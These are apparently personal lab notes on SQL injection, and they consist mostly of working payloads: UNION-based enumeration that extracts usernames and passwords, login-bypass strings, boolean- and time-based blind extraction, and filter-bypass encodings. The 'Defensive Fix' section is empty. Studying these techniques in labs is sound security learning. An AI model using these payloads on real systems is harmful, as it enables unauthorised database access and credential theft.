
## 1. SQL Injection

### What is it?
User input inserted directly into SQL query 
without sanitization. Attacker modifies the 
query logic.

### How to identify
Test every input field with:
```sql
'
```
Single quote. If page errors or behaves 
differently = potentially vulnerable.

### Types Practiced

**Union-Based (In-Band)**
Results visible directly on page.

```sql
-- Find column count
1 UNION SELECT 1--
1 UNION SELECT 1,2--
1 UNION SELECT 1,2,3--   ← no error = 3 columns

-- Make output visible
0 UNION SELECT 1,2,3

-- Get database name
0 UNION SELECT 1,2,database()

-- List tables
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = database()

-- List columns
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'users'

-- Extract credentials
0 UNION SELECT 1,2,group_concat(username,':',password 
SEPARATOR '<br>') FROM users
```

**Authentication Bypass (Blind)**
No data visible. Just success or failure.

```sql
' OR 1=1;--
' OR '1'='1
admin'--
```

Logic: `OR 1=1` is always true → returns all rows 
→ logged in as first user. `--` comments out 
password check entirely.

**Boolean-Based Blind**
No data on page. Only true/false response.
Extract data letter by letter.

```sql
-- Confirm injection
admin123' UNION SELECT 1,2,3 
where database() like '%';--

-- Find database name letter by letter
admin123' UNION SELECT 1,2,3 
where database() like 'a%';--
-- false → try s%
admin123' UNION SELECT 1,2,3 
where database() like 's%';--
-- true → first letter is s

-- Find tables
admin123' UNION SELECT 1,2,3 
FROM information_schema.tables 
WHERE table_schema = 'dbname' 
and table_name like 'u%';--

-- Extract password letter by letter
admin123' UNION SELECT 1,2,3 from users 
where username='admin' 
and password like '3%';--
```

**Time-Based Blind**
No visible response at all. Only timing signal.
Delay = TRUE. Instant = FALSE.

```sql
-- Find column count
admin123' UNION SELECT SLEEP(5);--      ← instant = wrong
admin123' UNION SELECT SLEEP(5),2;--    ← delay = 2 columns

-- Extract database name
admin123' UNION SELECT SLEEP(5),2 
where database() like 's%';--
-- 5 second delay = first letter is s 🐢
-- instant response = wrong letter ⚡

-- Extract credentials
admin123' UNION SELECT SLEEP(3),2 
from users where username='admin' 
and password like '4%';--
```

### Filter Bypass Techniques
Medium security blocks some characters. Bypass:

```sql
-- Hex encoding
0x61646d696e  instead of 'admin'

-- Comment variations
--    #    /**/

-- Case variation
SeLeCt instead of SELECT

-- Double encoding
%2527  instead of '
```

### Defensive Fix
